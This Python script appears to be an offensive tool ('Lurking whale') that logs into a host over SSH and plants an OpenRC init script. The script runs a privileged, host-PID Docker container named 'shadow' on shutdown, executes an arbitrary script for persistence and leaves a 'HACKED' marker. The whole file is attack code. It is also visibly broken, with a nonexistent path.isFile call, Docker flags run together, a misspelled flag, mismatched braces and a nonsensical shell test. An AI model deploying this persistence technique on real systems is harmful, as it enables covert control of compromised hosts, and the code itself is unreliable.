from os import path, system
from socket import socket, error
import paramiko
from client import open_client

def lurker(hostname, port, username, password):

    open_client(hostname=hostname, port=port, username=username, password=password)

    #check if the persist file exists in the init.d directory
    if path.isFile("/etc/init.d/persist"):
        print("Lurking whale is Lurking")
        pass
    else:

        #Thanks to Micheal Cherny and Sagie Dulce for their work on this
        file_contents = "#!/sbin/openrc-run\ndepend()\n{\n\tneed docker\n " \
                        "\tbefore killprocs \n" \
                        "\tbefore mount-ro \n" \
                        "\tbefore savecache\n}\n" \
                        "\nstart()\n" \
                        "}\n" \
                        "\tMS=\"\$(cat /etc/init.d/myscript.sh)\"\n" \
                        "\tdocker run -e MYSCRIPT =\"$MS\"" \
                        "--privelged=true" \
                        "--pid=host" \
                        "--name-shadow" \
                        "--restart=on-failure" \
                        "d4w/nsender /bin/sh -c \"\$MS\"\n)\n > /etc/init.d/persist"

        if system("! -z $MYSCRIPT"):
            system("echo {0} > /etc/init.d/myscript.sh".format(file_contents))

        system("chmod +x /etc/init.d/myscript.sh")
        system("chmod +x /etc/init.d/persist")
        system("rc-update add /etc/init.d/persist/ shutdown")
        system("rc-update -u")
        system("echo HACKED > /SHADOW")
        system("docker rm -f shadow")


